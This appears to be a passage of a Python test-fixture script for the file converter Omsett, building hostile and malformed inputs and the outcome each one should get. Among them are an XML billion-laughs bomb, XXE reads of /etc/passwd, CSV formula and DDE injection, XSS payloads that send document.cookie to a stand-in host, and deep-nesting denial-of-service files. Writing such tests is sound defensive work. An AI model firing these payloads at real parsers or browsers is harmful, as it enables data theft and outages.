xml_entities = b'<!ENTITY a0 "aaaaaaaaaa">'
for i in range(1, 9):
    xml_entities += b'<!ENTITY a%d "%s">' % (i, (b"&a%d;" % (i - 1)) * 10)
trap(
    "entity-bomb.xml",
    b'<?xml version="1.0"?>\n<!DOCTYPE l [' + xml_entities + b"]>\n<l>&a8;</l>\n",
    'The "billion laughs" in XML: eight shorthands, each standing for ten of the one before, '
    "a gigabyte if written out in full. The shorthand is left as written, not expanded.",
    "xml",
    node="succeeds",
    absent="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    group=G,
)
trap(
    "reads-a-local-file.xml",
    b'<?xml version="1.0"?>\n<!DOCTYPE l [<!ENTITY x SYSTEM "file:///etc/passwd">]>\n<l>&x;</l>\n',
    "Asks the reader to fetch a file from the computer and paste it into the document. A file "
    "that names anything outside itself is refused outright.",
    "xml",
    node="fails",
    note="This file is not valid XML",
    group=G,
)
trap(
    "wrong-closing-tag.xml",
    b"<people><person><name>Ada</person></people>\n",
    "A tag closed by a different tag. A forgiving reader guesses what was meant and returns "
    "something; this is refused.",
    "xml",
    node="fails",
    note="This file is not valid XML",
    group=G,
)
trap(
    "two-documents.xml",
    b"<people><name>Ada</name></people>\n<people><name>Grace</name></people>\n",
    "Two outermost tags where a document has exactly one.",
    "xml",
    node="fails",
    note="This file is not valid XML",
    group=G,
)
trap(
    "web-page.xml",
    b"<!DOCTYPE html>\n<html><head><title>x</title></head><body><p>Hello<br>there</body></html>\n",
    "A web page with an .xml name. It begins with a tag, as XML does, and is not data: it is "
    "converted as the web page it is.",
    "html",
    node="succeeds",
    mismatch=True,
    group=G,
)

trap(
    "quote-never-closed.csv",
    b'id,name,note\n1,Ada,"wrote the first program\n2,Grace,found the first bug\n',
    "A quoted cell with no closing quote, which swallows the rest of the file. Refused, not "
    "returned as one enormous cell.",
    "csv",
    node="fails",
    note="A quoted value in this table is never closed",
    group=G,
)
trap(
    "spreadsheet-formulas.csv",
    b'name,amount\nAda,"=HYPERLINK(""http://elsewhere.example/?""&A1,""Click"")"\n'
    b"Grace,=cmd|' /C calc'!A0\nKatherine,@SUM(1+1)\n",
    "Cells a spreadsheet program would run as formulas when the file is opened. To Omsett "
    "they are text and are carried across unchanged.",
    "csv",
    node="succeeds",
    group=G,
)
trap(
    "picture-named.csv",
    GOOD,
    "A PNG with a .csv name. A name settles which kind of text a file is, never whether it is "
    "text.",
    "png",
    node="succeeds",
    mismatch=True,
    group=G,
)
trap(
    "table-named.png",
    b"id,name\n1,Ada\n2,Grace\n",
    "A table with a .png name. It is not a picture, and with a name that says it is not data "
    "it is not offered as data.",
    "unknown",
    group=G,
)
trap(
    "latin-1.csv",
    "id,name\n1,Zoë\n2,Renée\n".encode("latin-1"),
    "A table saved in an older encoding, where an accented letter is a single byte that is "
    "not valid UTF-8. Guessing the encoding would risk garbling every name in it.",
    "unknown",
    group=G,
)
trap(
    "notes.txt",
    b"Shopping, Thursday\nmilk, eggs\nbread: two loaves\n",
    "Ordinary notes that happen to have commas and colons in them. A .txt name says they are "
    "not a table.",
    "unknown",
    group=G,
)

# --- subtitles: SRT, WebVTT, ASS, SSA, TTML, LRC, SBV, SAMI, MicroDVD -----------------------------
# Text again, read by Omsett's own readers. What goes wrong here: times that are not times, a
# small file that asks to become a large one, markup that hopes to be run somewhere later, one
# format wearing another's name, and input shaped to make a careless reader take hours over it.
# Each is converted to SRT (an SRT file, to WebVTT).
G = "subtitles"
NOT = "This file is not valid %s"
NONE = "This file has no subtitles in it"
BACKWARDS = "A subtitle in this file ends before it starts"
TOO_MANY = "This file holds more subtitles than Omsett will convert"
SRT_GOOD = b"1\n00:00:01,000 --> 00:00:04,000\nDrop a file.\n\n2\n00:00:04,500 --> 00:00:07,250\nPick a format.\n"


def sub(name, data, why, detect, **more):
    trap(name, data, why, detect, group=G, **more)


# SRT
sub(
    "truncated.srt",
    SRT_GOOD + b"\n3\n00:00:08,000 --> 00:0",
    "An SRT file that stops in the middle of a time, as a download cut short does.",
    "srt", node="fails", note=NOT % "SRT",
)
sub(
    "ends-before-it-starts.srt",
    b"1\n00:00:09,000 --> 00:00:02,000\nShown for minus seven seconds.\n",
    "A subtitle whose end comes before its start. Written out as it is, it would never be shown.",
    "srt", node="fails", note=BACKWARDS,
)
sub(
    "impossible-time.srt",
    SRT_GOOD + b"\n3\n00:00:08,000 --> 99999999999999999999:75:99,000\nWhen?\n",
    "A time with twenty digits of hours, seventy-five minutes and ninety-nine seconds.",
    "srt", node="fails", note=NOT % "SRT",
)
sub(
    "no-words.srt",
    b"1\n00:00:01,000 --> 00:00:04,000\n\n2\n00:00:04,500 --> 00:00:07,250\n<i></i>\n",
    "Times with nothing to say at any of them. There is nothing to convert.",
    "srt", node="fails", note=NONE,
)
sub(
    "script-in-subtitles.srt",
    b'1\n00:00:01,000 --> 00:00:04,000\n<script>fetch("http://elsewhere.example/"+document.cookie)</script>'
    b'<img src=x onerror=alert(1)>Hello\n\n2\n00:00:05,000 --> 00:00:06,000\n'
    b'<a href="javascript:alert(2)">there</a>\n',
    "Subtitles carrying a script, a picture that runs code when it fails to load, and a link "
    "that runs code. Tags are not carried across, so none of the three survives as a tag.",
    "srt", node="succeeds", absent="onerror",
)
sub(
    "tag-inside-a-tag.srt",
    b"1\n00:00:01,000 --> 00:00:04,000\n<scr<script>ipt>alert(1)</scr</script>ipt>\n",
    "A tag split in two with another tag in the gap, so that removing tags puts one together. "
    "What is left is written as text, with its angle brackets spelled out.",
    "srt", node="succeeds", absent="<script",
)
sub(
    "words-before-any-time.srt",
    b"1\n00:00:01,000 --> 00:00:04,000\nFine.\n\n2\nNo time here, only words\n\n00:00:05,000 -> 00:00:06,000\nA one-dash arrow.\n",
    "A subtitle with no time, and one whose arrow is misspelled. Neither can be told from "
    "words that belong to the subtitle above, so that is what they become.",
    "srt", node="succeeds",
)
sub(
    "arrow-in-the-wrong-place.srt",
    b"1\nHello\nthere\n00:00:01,000 --> 00:00:04,000\n",
    "The time comes after the words it belongs to.",
    "unknown",
)
sub(
    "picture-named.srt",
    GOOD,
    "A PNG with an .srt name.",
    "png", node="succeeds", mismatch=True,
)
sub(
    "subtitles-named.txt",
    SRT_GOOD,
    "Sound SRT subtitles in a file named .txt. Subtitles are known by how they read, so the "
    "name does not hide them.",
    "srt", node="succeeds", mismatch=True,
)
sub(
    "latin-1.srt",
    "1\n00:00:01,000 --> 00:00:04,000\nZoë déjà vu\n".encode("latin-1"),
    "Subtitles saved in an older encoding. Guessing which would risk garbling every accent.",
    "unknown",
)
sub(
    "utf-16.srt",
    b"\xff\xfe" + "1\n00:00:01,000 --> 00:00:04,000\nHello\n".encode("utf-16-le"),
    "Subtitles saved as UTF-16, two bytes to a letter, which Omsett does not read.",
    "unknown",
)
sub(
    "nothing-inside.srt",
    b"",
    "A file with a subtitle name and no bytes at all.",
    "unknown",
)
sub(
    "zero-bytes-inside.srt",
    b"1\n00:00:01,000 --> 00:00:04,000\nHel\x00lo\x00\x00\n",
    "Subtitles with zero bytes among the words, which no text file holds.",
    "unknown",
)

# WebVTT
VTT_GOOD = b"WEBVTT\n\n00:00:01.000 --> 00:00:04.000\nDrop a file.\n"
sub(
    "truncated.vtt",
    VTT_GOOD + b"\n00:00:04.500 --> 00:00:0",
    "A WebVTT file that stops in the middle of a time.",
    "vtt", node="fails", note=NOT % "WebVTT",
)
sub(
    "no-heading.vtt",
    b"00:00:01.000 --> 00:00:04.000\nDrop a file.\n",
    "WebVTT must open with the word WEBVTT. Without it this reads as SRT, which is what it is "
    "converted as, and the card says the name and the contents disagree.",
    "srt", node="succeeds", mismatch=True,
)
sub(
    "almost-the-heading.vtt",
    b"WEBVTTX\n\n00:00:01.000 --> 00:00:04.000\nDrop a file.\n",
    "The opening word with one letter too many.",
    "unknown",
)
sub(
    "ninety-minutes-past.vtt",
    VTT_GOOD + b"\n00:90:00.000 --> 00:91:00.000\nMinutes stop at fifty-nine.\n",
    "A time of ninety minutes past the hour.",
    "vtt", node="fails", note=NOT % "WebVTT",
)
sub(
    "words-with-no-time.vtt",
    VTT_GOOD + b"\nA paragraph that belongs to no time at all.\n",
    "A block of words with no time above it. WebVTT does not allow one, and a reader that "
    "skipped it would be throwing text away without saying so.",
    "vtt", node="fails", note=NOT % "WebVTT",
)
sub(
    "escaped-twice.vtt",
    b"WEBVTT\n\n00:00:01.000 --> 00:00:04.000\n&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;\n",
    "A script tag escaped twice over, hoping to be unescaped twice and come out as a tag. It "
    "is unescaped once, and stays text.",
    "vtt", node="succeeds", absent="<script",
)
sub(
    "only-notes.vtt",
    b"WEBVTT\n\nNOTE\n00:00:01.000 --> 00:00:04.000\nThis is inside a note.\n\nSTYLE\n::cue { color: red }\n",
    "A file whose only subtitle is inside a note, where it is a remark and not a subtitle.",
    "vtt", node="fails", note=NONE,
)

# ASS
ASS_HEAD = (
    b"[Script Info]\nScriptType: v4.00+\n\n[V4+ Styles]\n"
    b"Format: Name, Fontname, Fontsize\nStyle: Default,Arial,16\n\n[Events]\n"
    b"Format: Layer, Start, End, Style, Name, MarginL, MarginR, MarginV, Effect, Text\n"
)
ASS_LINE = b"Dialogue: 0,0:00:01.00,0:00:04.00,Default,,0,0,0,,Drop a file.\n"
sub(
    "truncated.ass",
    ASS_HEAD + ASS_LINE + b"Dialogue: 0,0:00:04.50,0:00:0",
    "An ASS file that stops in the middle of a line, before its words.",
    "ass", node="fails", note=NOT % "ASS",
)
sub(
    "braces-never-closed.ass",
    ASS_HEAD + b"Dialogue: 0,0:00:01.00,0:00:04.00,Default,,0,0,0,," + b"{" * 200_000 + b"\n",
    "Two hundred thousand opening braces and no closing one. A reader that looks for the "
    "partner of each would look two hundred thousand times through the same line.",
    "ass", node="succeeds",
)
sub(
    "no-events.ass",
    b"[Script Info]\nTitle: Styles and nothing else\nScriptType: v4.00+\n\n[V4+ Styles]\nStyle: Default,Arial,16\n",
    "A heading and styles, and no section of subtitles.",
    "ass", node="fails", note=NOT % "ASS",
)
sub(
    "columns-lie.ass",
    b"[Script Info]\n\n[Events]\nFormat: Text, Start, End\n"
    b"Dialogue: Hello, said the spider, to the fly,0:00:01.00,0:00:04.00\n",
    "The file says the words are the first column. They may hold commas, so they can only be "
    "the last; read as told, the times would be found inside the sentence.",
    "ass", node="fails", note=NOT % "ASS",
)
sub(
    "a-thousand-columns.ass",
    b"[Script Info]\n\n[Events]\nFormat: " + b"Layer, " * 1000 + b"Start, End, Text\n"
    + b"Dialogue: " + b"0," * 1000 + b"0:00:01.00,0:00:04.00,Hello\n",
    "A line said to have a thousand and three columns.",
    "ass", node="fails", note=NOT % "ASS",
)
sub(
    "only-drawings.ass",
    ASS_HEAD + b"Dialogue: 0,0:00:01.00,0:00:04.00,Default,,0,0,0,,{\\p1}m 0 0 l 100 0 100 100 0 100\n",
    "Every line is a drawing, not words. Written as text it would be a row of numbers.",
    "ass", node="fails", note=NONE,
)
sub(
    "times-are-words.ass",
    ASS_HEAD + b"Dialogue: 0,yesterday,tomorrow,Default,,0,0,0,,When?\n",
    "Words where the start and end times belong.",
    "ass", node="fails", note=NOT % "ASS",
)
sub(
    "heading-only.toml",
    b"[Script Info]\ntitle = \"x\"\n",
    "A file with a .toml name that opens with the heading every ASS file opens with. It is "
    "taken for ASS, found to have no subtitles section, and refused.",
    "ass", node="fails", note=NOT % "ASS", mismatch=True,
)

# SSA
SSA_HEAD = (
    b"[Script Info]\nScriptType: v4.00\n\n[V4 Styles]\nStyle: Default,Arial,16\n\n[Events]\n"
    b"Format: Marked, Start, End, Style, Name, MarginL, MarginR, MarginV, Effect, Text\n"
)
sub(
    "truncated.ssa",
    SSA_HEAD + b"Dialogue: Marked=0,0:00:01.00,0:00:04.00,Default,,0,0,0,,Fine.\nDialogue: Marked=0,0:00:0",
    "An SSA file that stops in the middle of a line.",
    "ssa", node="fails", note=NOT % "SSA",
)
sub(
    "ends-before-it-starts.ssa",
    SSA_HEAD + b"Dialogue: Marked=0,0:00:09.00,0:00:02.00,Default,,0,0,0,,Backwards.\n",
    "A line whose end comes before its start.",
    "ssa", node="fails", note=BACKWARDS,
)
sub(
    "newer-than-it-says.ssa",
    ASS_HEAD + ASS_LINE,
    "An ASS file with an .ssa name. The two differ in their headings, and the headings win.",
    "ass", node="succeeds", mismatch=True,
)
sub(
    "no-columns-named.ssa",
    b"[Script Info]\nScriptType: v4.00\n\n[Events]\nDialogue: Marked=0,0:00:01.00,0:00:04.00,Default,,0,0,0,,Words, with a comma.\n",
    "Valid, but the line naming the columns is missing. The usual order is assumed.",
    "ssa", node="succeeds",
)

# SBV
SBV_GOOD = b"0:00:01.000,0:00:04.000\nDrop a file.\n"
sub(
    "truncated.sbv",
    SBV_GOOD + b"\n0:00:04.500,0:00:0",
    "An SBV file that stops in the middle of a time.",
    "sbv", node="fails", note=NOT % "SBV",
)
sub(
    "ends-before-it-starts.sbv",
    b"0:00:09.000,0:00:02.000\nBackwards.\n",
    "A caption whose end comes before its start.",
    "sbv", node="fails", note=BACKWARDS,
)
sub(
    "captions-named.csv",
    SBV_GOOD + b"\n0:00:04.500,0:00:07.250\nPick a format.\n",
    "SBV captions with a .csv name. The first line has a comma in it, as a table's would, and "
    "is two times all the same.",
    "sbv", node="succeeds", mismatch=True,
)
sub(
    "table-named.sbv",
    b"start,end,words\n1,4,Drop a file\n",
    "A table with an .sbv name. It does not read as captions, and its name says it is not a "
    "table.",
    "unknown",
)

# LRC
sub(
    "truncated.lrc",
    b"[00:01.00]Drop a file\n[00:04.5",
    "A lyrics file that stops in the middle of a time.",
    "lrc", node="fails", note=NOT % "LRC",
)
sub(
    "lyrics-bomb.lrc",
    b"[0:00]" * 20_000 + b"la " * 700 + b"\n",
    "One line of lyrics with twenty thousand times in front of it, which asks for the line to "
    "be written out twenty thousand times: 120 KB that would become 40 MB.",
    "lrc", node="fails", note=TOO_MANY,
)
sub(
    "times-and-no-words.lrc",
    b"[00:01.00]\n[00:04.50]\n[00:07.25]<00:08.00>\n",
    "Times with no lyrics at any of them.",
    "lrc", node="fails", note=NONE,
)
sub(
    "no-times.lrc",
    b"[ti:A song]\n[ar:Someone]\n[al:Somewhere]\n",
    "A title, an artist and an album, and not one timed line.",
    "unknown",
)
sub(
    "ninety-nine-seconds.lrc",
    b"[00:99.00]Seconds stop at fifty-nine\n",
    "A time of ninety-nine seconds past the minute.",
    "unknown",
)
sub(
    "list-named.lrc",
    b"[1, 2, 3]\n",
    "A JSON list with an .lrc name. Both open with a square bracket.",
    "json", node="succeeds", mismatch=True,
)
sub(
    "words-between-the-lines.lrc",
    b"[00:01.00]Drop a file\nthis line has no time\n[00:04.50]Pick a format\n",
    "A line with no time among lines that have one.",
    "lrc", node="fails", note=NOT % "LRC",
)

# MicroDVD
sub(
    "truncated.sub",
    b"{25}{100}Drop a file.\n{113}{18",
    "A MicroDVD file that stops in the middle of a frame number.",
    "microdvd", node="fails", note=NOT % "MicroDVD",
)
sub(
    "no-frames-a-second.sub",
    b"{1}{1}0\n{25}{100}Drop a file.\n",
    "The file says the video plays at no frames a second, which would put every subtitle at "
    "infinity.",
    "microdvd", node="fails", note=NOT % "MicroDVD",
)
sub(
    "ends-before-it-starts.sub",
    b"{100}{25}Backwards.\n",
    "A subtitle that ends seventy-five frames before it starts.",
    "microdvd", node="fails", note=BACKWARDS,
)
sub(
    "frame-beyond-counting.sub",
    b"{25}{100}Drop a file.\n{99999999999999999999}{999999999999999999999}Later.\n",
    "A frame number of twenty digits: a film some billions of years long.",
    "microdvd", node="fails", note=NOT % "MicroDVD",
)
sub(
    "object-named.sub",
    b'{"1": "one", "2": "two"}\n',
    "A JSON object with a .sub name. Both open with a brace.",
    "json", node="succeeds", mismatch=True,
)
sub(
    "dvd-subtitles.sub",
    b"\x00\x00\x01\xba\x44\x00\x04\x00\x04\x01\x01\x89\xc3\xf8" + bytes(range(256)) * 8,
    "The other kind of .sub file: pictures of subtitles copied from a DVD, not text. There are "
    "no words in it to convert.",
    "unregistered",
)

# TTML
TT = b'<?xml version="1.0" encoding="UTF-8"?>\n<tt xmlns="http://www.w3.org/ns/ttml">\n<body><div>\n'
TT_GOOD = b'<p begin="00:00:01.000" end="00:00:04.000">Drop a file.</p>\n'
TT_END = b"</div></body>\n</tt>\n"
sub(
    "truncated.ttml",
    TT + TT_GOOD + b'<p begin="00:00:04.500" end="00:0',
    "A TTML file that stops in the middle of a tag.",
    "ttml", node="fails", note=NOT % "TTML",
)
sub(
    "entity-bomb.ttml",
    b'<?xml version="1.0"?>\n<!DOCTYPE tt [' + xml_entities + b"]>\n"
    b'<tt xmlns="http://www.w3.org/ns/ttml"><body><div><p begin="1s" end="2s">&a8;</p></div></body></tt>\n',
    'The "billion laughs" as a subtitle: one line that stands for a gigabyte of the letter a. '
    "The shorthand is left as written, not expanded.",
    "ttml", node="succeeds", absent="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
)
sub(
    "reads-a-local-file.ttml",
    b'<?xml version="1.0"?>\n<!DOCTYPE tt [<!ENTITY x SYSTEM "file:///etc/passwd">]>\n'
    b'<tt xmlns="http://www.w3.org/ns/ttml"><body><div><p begin="1s" end="2s">&x;</p></div></body></tt>\n',
    "Asks the reader to fetch a file from the computer and show it as a subtitle. A file that "
    "names anything outside itself is refused outright.",
    "ttml", node="fails", note=NOT % "TTML",
)
sub(
    "nested-ten-thousand-deep.ttml",
    TT + b'<p begin="1s" end="2s">' + b"<span>" * 10_000 + b"deep" + b"</span>" * 10_000 + b"</p>\n" + TT_END,
    "One subtitle inside ten thousand tags, each inside the last: enough to exhaust a reader "
    "that goes one level deeper for every tag.",
    "ttml", node="fails", note=NOT % "TTML",
)
sub(
    "time-is-a-word.ttml",
    TT + b'<p begin="soon" end="later">When?</p>\n' + TT_END,
    "Words where the start and end times belong.",
    "ttml", node="fails", note=NOT % "TTML",
)
sub(
    "no-frames-a-second.ttml",
    b'<tt xmlns="http://www.w3.org/ns/ttml" xmlns:ttp="http://www.w3.org/ns/ttml#parameter" ttp:frameRate="0">'
    b'<body><div><p begin="00:00:01:12" end="00:00:02:00">Divided by nothing.</p></div></body></tt>\n',
    "Times counted in frames, in a file that says there are no frames in a second.",
    "ttml", node="fails", note=NOT % "TTML",
)
sub(
    "no-times.ttml",
    TT + b"<p>Never shown.</p>\n<p>Nor this.</p>\n" + TT_END,
    "Paragraphs with no time on any of them.",
    "ttml", node="fails", note=NONE,
)
sub(
    "ends-before-it-starts.ttml",
    TT + b'<p begin="9s" end="2s">Backwards.</p>\n' + TT_END,
    "A subtitle whose end comes before its start.",
    "ttml", node="fails", note=BACKWARDS,
)
sub(
    "subtitles-in-a-comment.ttml",
    b'<?xml version="1.0"?>\n<!-- <tt xmlns="http://www.w3.org/ns/ttml"> -->\n<people><name>Ada</name></people>\n',
    "Ordinary XML with a .ttml name, and a comment that mentions the tag TTML begins with. A "
    "comment is not a tag: this is data, and is converted as data.",
    "xml", node="succeeds", mismatch=True,
)
sub(
    "subtitles-named.xml",
    TT + TT_GOOD + TT_END,
    "Sound TTML subtitles with an .xml name. They are XML, and they are subtitles first.",
    "ttml", node="succeeds", mismatch=True,
)

# SAMI
SAMI_GOOD = b"<SAMI>\n<BODY>\n<SYNC Start=1000><P Class=ENCC>Drop a file.\n<SYNC Start=4000><P Class=ENCC>&nbsp;\n"
sub(
    "truncated.smi",
    SAMI_GOOD + b"<SYNC Start=4500><P Class=ENCC>Pick a format.\n<SYNC Start=72",
    "A SAMI file that stops in the middle of a tag. Nothing in the format marks where it "
    "should end, so the subtitles that are whole are kept and the broken tag is dropped.",
    "smi", node="succeeds", absent="SYNC",
)
sub(
    "no-subtitles.smi",
    b"<SAMI>\n<HEAD><TITLE>Empty</TITLE></HEAD>\n<BODY>\n</BODY>\n</SAMI>\n",
    "A complete SAMI file with nothing in its body.",
    "smi", node="fails", note=NONE,
)
sub(
    "script-in-captions.smi",
    b"<SAMI>\n<BODY>\n<SYNC Start=1000><P Class=ENCC onmouseover=alert(1)>"
    b"<script>alert(document.cookie)</script><iframe src=//elsewhere.example></iframe>Hello\n"
    b"<SYNC Start=4000><P Class=ENCC>&nbsp;\n</BODY>\n</SAMI>\n",
    "SAMI is written like a web page, and this one carries a script, a frame from another "
    "site, and a paragraph that runs code when pointed at. None is carried across.",
    "smi", node="succeeds", absent="iframe",
)
sub(
    "comments-never-closed.smi",
    SAMI_GOOD + b"<!--" * 50_000 + b"\n",
    "Fifty thousand comments opened and none closed, after the subtitles. Everything from the "
    "first of them on is a comment.",
    "smi", node="succeeds", absent="<!--",
)
sub(
    "time-beyond-counting.smi",
    b"<SAMI>\n<BODY>\n<SYNC Start=99999999999999999999><P>Some billions of years in.\n</BODY>\n</SAMI>\n",
    "A subtitle said to start at a time twenty digits long.",
    "smi", node="fails", note=NONE,
)
sub(
    "web-page-named.smi",
    b"<!DOCTYPE html>\n<html><body><p>Hello</p></body></html>\n",
    "A web page with a .smi name. SAMI looks like one, and is not one.",
    "html", node="succeeds", mismatch=True,
)

# --- text: Markdown and HTML ----------------------------------------------------------------------
# Both can carry things that run when the result is opened: scripts, handlers, links that are
# code, pages loaded from elsewhere. Both can be nested without limit. And Markdown has no
# invalid form at all, so the question for it is never "is this valid" but "what did it let
# through". Each is converted to the other.
G = "text"
NO_TEXT = "This file has no text in it to convert"
TOO_DEEP = "This file is nested too deeply to convert"


def text(name, data, why, detect, **more):
    trap(name, data, why, detect, group=G, **more)


text(
    "script-in-markdown.md",
    b"# Notes\n\nHello.\n\n<script>fetch('http://elsewhere.example/'+document.cookie)</script>\n\n"
    b"<img src=x onerror=\"alert(1)\">\n\n<svg onload=alert(2)></svg>\n\n<b onmouseover=alert(3)>bold</b>\n",
    "Markdown may hold HTML, and this holds a script, a picture and a drawing that run code "
    "when they load, and a word that runs code when pointed at. The words are kept; nothing "
    "that could run is.",
    "md", node="succeeds", absent="alert(",
)
text(
    "links-that-are-code.md",
    b"# Links\n\n[click me](javascript:alert(1)) and [me](JaVaScRiPt:alert(2)) and "
    b"[me too](&#106;avascript:alert(3)) and ![a picture](javascript:alert(4)) and "
    b"[a page](data:text/html;base64,PHNjcmlwdD5hbGVydCg1KTwvc2NyaXB0Pg==) and "
    b"<a href=\"vbscript:alert(6)\">an old one</a>.\n",
    "Six links that run code when followed, spelled six ways. Each keeps its words and "
    "loses its address.",
    "md", node="succeeds", absent="alert(",
)
text(
    "title-breaks-out.md",
    b"# </title><script>alert(1)</script><title>\n\nWords.\n",
    "A heading written to close the page's title early and start a script after it.",
    "md", node="succeeds", absent="<script",
)
text(
    "page-takes-over.md",
    b"# Welcome\n\n<meta http-equiv=\"refresh\" content=\"0;url=http://elsewhere.example/\">\n\n"
    b"<base href=\"http://elsewhere.example/\">\n\n<link rel=\"stylesheet\" href=\"http://elsewhere.example/x.css\">\n\n"
    b"<form action=\"http://elsewhere.example/steal\"><input name=\"password\"><button>Sign in</button></form>\n\n"
    b"<iframe src=\"http://elsewhere.example/\"></iframe>\n\n<object data=\"http://elsewhere.example/x.swf\"></object>\n",
    "HTML inside Markdown that would send the reader to another site, load its styles, frame "
    "it, and post a password to it. None of it is written to the page.",
    "md", node="succeeds", absent="elsewhere.example",
)
text(
    "quotes-ten-thousand-deep.md",
    b">" * 10_000 + b" deep\n",
    "One word inside ten thousand quotations, each inside the last.",
    "md", node="fails", note=TOO_DEEP,
)
text(
    "lists-a-thousand-deep.md",
    b"".join(b" " * (2 * i) + b"- level\n" for i in range(1000)),
    "A list inside a list, a thousand times over. Read in full it takes most of a minute; it "
    "is refused before reading starts.",
    "md", node="fails", note=TOO_DEEP,
)
text(
    "brackets-never-closed.md",
    b"[" * 50_000 + b"\n",
    "Fifty thousand opening brackets. Each could begin a link, and none does.",
    "md", node="succeeds",
)
text(
    "emphasis-never-closed.md",
    b"*a _b " * 20_000 + b"\n",
    "Forty thousand marks that open emphasis and none that closes it.",
    "md", node="succeeds",
)
text(
    "truncated.md",
    b"# Report\n\n| Name | Born |\n| ---- | --\n\n```js\nconst unfinished = [1, 2,\n\nSee [the rest](http",
    "Markdown that stops mid-table, mid-code and mid-link. Markdown has no invalid form, so "
    "this converts as far as it goes.",
    "md", node="succeeds",
)
text(
    "only-a-comment.md",
    b"<!-- nothing to see -->\n\n<!-- nor here -->\n",
    "Markdown holding comments and no words.",
    "md", node="fails", note=NO_TEXT,
)
text(
    "picture-named.md",
    GOOD,
    "A PNG with an .md name. A name can say that text is Markdown; it cannot make text of a "
    "picture.",
    "png", node="succeeds", mismatch=True,
)
text(
    "latin-1.md",
    "# Résumé\n\nZoë, déjà vu.\n".encode("latin-1"),
    "Markdown saved in an older encoding.",
    "unknown",
)
text(
    "zero-bytes-inside.md",
    b"# Title\n\nHel\x00lo\x00\n",
    "Markdown with zero bytes among the words, which no text file holds.",
    "unknown",
)
text(
    "nothing-inside.md",
    b"",
    "A file with a Markdown name and no bytes at all.",
    "unknown",
)

text(
    "truncated.html",
    b"<!doctype html>\n<html><body><h1>Report</h1><p>The first paragraph.</p><table><tr><td>cell</td><td cla",
    "A web page that stops in the middle of a tag. Browsers show what there is, and so does "
    "this: the words that arrived are kept.",
    "html", node="succeeds", absent="cla",
)
text(
    "nested-ten-thousand-deep.html",
    b"<!doctype html>\n<html><body>" + b"<div>" * 10_000 + b"deep" + b"</div>" * 10_000 + b"</body></html>\n",
    "One word inside ten thousand boxes, each inside the last: enough to exhaust a reader "
    "that goes one level deeper for every tag.",
    "html", node="fails", note=TOO_DEEP,
)
text(
    "nothing-but-scripts.html",
    b"<!doctype html>\n<html><head><script>track()</script><style>body{display:none}</style></head>"
    b"<body><script>document.write('<h1>Hello</h1>')</script><noscript>Turn on JavaScript</noscript></body></html>\n",
    "A page whose words are all written by a script when it runs. Nothing here runs, so there "
    "are no words.",
    "html", node="fails", note=NO_TEXT,
)
text(
    "everything-that-runs.html",
    b"<!doctype html>\n<html><body onload=\"alert(1)\"><h1 onclick=\"alert(2)\">Title</h1>"
    b"<p><a href=\"javascript:alert(3)\">a link</a> <img src=\"x\" onerror=\"alert(4)\" alt=\"a picture\">"
    b"<svg><script>alert(5)</script></svg><math><maction actiontype=\"statusline#alert(6)\">x</maction></math>"
    b"<iframe srcdoc=\"<script>alert(7)</script>\"></iframe><embed src=\"javascript:alert(8)\">"
    b"<a href=\" &#14; javascript:alert(9)\">another</a></p></body></html>\n",
    "A page with code in nine places a browser would run it from. The Markdown keeps the "
    "heading, the link's words and the picture's description.",
    "html", node="succeeds", absent="alert(",
)
text(
    "hidden-words.html",
    b"<!doctype html>\n<html><head><title>NOT-CONTENT-1</title><style>.x::after{content:'NOT-CONTENT-2'}</style></head>"
    b"<body><p>Shown.</p><template><p>NOT-CONTENT-3</p></template><script type=\"application/json\">{\"k\":\"NOT-CONTENT-4\"}</script></body></html>\n",
    "Text in a page's title, styles, template and embedded data: none of it is what the page "
    "says to a reader, and none of it is written out as if it were.",
    "html", node="succeeds", absent="NOT-CONTENT",
)
text(
    "doctype-and-nothing-else.html",
    b"<!doctype html>\n",
    "The line that opens a web page, and no page.",
    "html", node="fails", note=NO_TEXT,
)
text(
    "a-hundred-thousand-attributes.html",
    b"<!doctype html>\n<html><body><p " + b"".join(b"a%d=1 " % i for i in range(100_000)) + b">Words.</p></body></html>\n",
    "One paragraph with a hundred thousand attributes on it.",
    "html", node="succeeds", absent="a99999",
)
text(
    "comments-never-closed.html",
    b"<!doctype html>\n<html><body><p>Words.</p>" + b"<!--" * 50_000 + b"\n",
    "Fifty thousand comments opened and none closed, after the words.",
    "html", node="succeeds", absent="<!--",
)
text(
    "page-named.json",
    b"<!doctype html>\n<html><body><h1>Not data</h1><p>A page.</p></body></html>\n",
    "A web page with a .json name.",
    "html", node="succeeds", mismatch=True,
)
text(
    "piece-of-a-page.html",
    b"<h1>No page around it</h1>\n<p>A heading and a paragraph, with no html or body tag.</p>\n",
    "A piece of a page with nothing around it. Unnamed it would read as XML; its name says "
    "what it is.",
    "html", node="succeeds",
)
text(
    "utf-16.html",
    b"\xff\xfe" + "<!doctype html>\n<html><body><p>Hello</p></body></html>\n".encode("utf-16-le"),
    "A web page saved as UTF-16, two bytes to a letter, which Omsett does not read.",
    "unknown",
)

# --- fonts: TTF, OTF, WOFF, WOFF2 -----------------------------------------------------------------
# A font is a list of tables, each with a place, a length and a checksum, and a web font packs
# those tables smaller. What goes wrong: the list points outside the file or at itself, a
# packed table unpacks to far more than it said, a byte is changed and the checksum is not,
# and files that open like a font and hold nothing a font needs. Each is converted to WOFF (a
# WOFF, to TTF).
G = "fonts"
NOT_FONT = "This file is not a valid %s font"
DAMAGED = "This font is damaged: part of it does not match its own checksum"
TOO_BIG = "This font is too large to convert"


def sample(path):
    with open(os.path.join(FIXTURES, path), "rb") as f:
        return f.read()


TTF, OTF, WOFF_, WOFF2_ = sample("ttf/sample.ttf"), sample("otf/sample.otf"), sample("woff/sample.woff"), sample("woff2/sample.woff2")


def font_sum(data: bytes) -> int:
    data += b"\0" * (-len(data) % 4)
    return sum(struct.unpack(">%dI" % (len(data) // 4), data)) & 0xFFFFFFFF


def tables_of(font: bytes):
    count = struct.unpack(">H", font[4:6])[0]
    found = []
    for i in range(count):
        tag, _, offset, length = struct.unpack(">4sIII", font[12 + 16 * i : 28 + 16 * i])
        found.append((tag, font[offset : offset + length]))
    return found


def sfnt(tables, flavor=b"\x00\x01\x00\x00") -> bytes:
    """A font file from tables, every checksum correct: what is wrong with it is only what was meant."""
    tables = sorted(tables, key=lambda t: t[0])
    offset = 12 + 16 * len(tables)
    directory, body = b"", b""
    for tag, data in tables:
